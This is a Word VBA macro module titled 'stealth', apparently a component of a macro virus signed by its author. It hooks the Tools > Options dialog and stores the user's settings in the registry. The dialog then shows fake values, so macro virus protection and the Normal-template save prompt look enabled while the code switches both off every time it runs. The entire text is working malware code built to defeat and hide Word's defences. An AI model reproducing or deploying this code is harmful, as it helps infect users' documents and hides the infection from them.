Attribute VB_Name = "stealth"
Sub ToolsOptions()
'by VOVAN//SMF
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") Then GoTo 1
If Options.VirusProtection = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
1: If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Then Options.VirusProtection = 1 Else Options.VirusProtection = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Then Options.SaveNormalPrompt = 1 Else Options.SaveNormalPrompt = 0
If Dialogs(wdDialogToolsOptions).Show >= 0 Then
Exit Sub
End If
If Options.VirusProtection = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
End Sub
